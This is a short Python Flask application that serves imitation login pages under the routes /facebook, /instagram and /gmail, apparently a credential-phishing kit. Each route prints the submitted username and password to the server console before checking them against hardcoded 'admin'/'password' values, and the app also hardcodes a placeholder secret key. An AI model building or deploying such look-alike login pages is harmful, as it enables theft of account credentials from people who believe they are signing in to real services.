from flask import Flask, render_template, request, session, url_for

app = Flask(__name__)
app.secret_key = 'your_secret_key'




@app.route('/')
def index():
    return render_template('index.html')


@app.route('/facebook', methods=['GET', 'POST'])
def facebooklogin():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        print(username)
        print(password)

        # Compare the submitted credentials with the hardcoded credentials
        if username == 'admin' and password == 'password':
            session['logged_in'] = True
            return 'You are logged in.'
        else:
            return 'Invalid credentials.'

    return render_template('Facebooklogin.html')


@app.route('/instagram', methods=['GET', 'POST'])
def Instalogin():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        print(username)
        print(password)

        # Compare the submitted credentials with the hardcoded credentials
        if username == 'admin' and password == 'password':
            session['logged_in'] = True
            return 'You are logged in.'
        else:
            return 'Invalid credentials.'

    return render_template('Instalogin.html')


@app.route('/gmail', methods=['GET', 'POST'])
def gmaillogin():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        print(username)
        print(password)

        # Compare the submitted credentials with the hardcoded credentials
        if username == 'admin' and password == 'password':
            session['logged_in'] = True
            return 'You are logged in.'
        else:
            return 'Invalid credentials.'

    return render_template('gmailLogin.html')

if __name__ == '__main__':
    app.run()
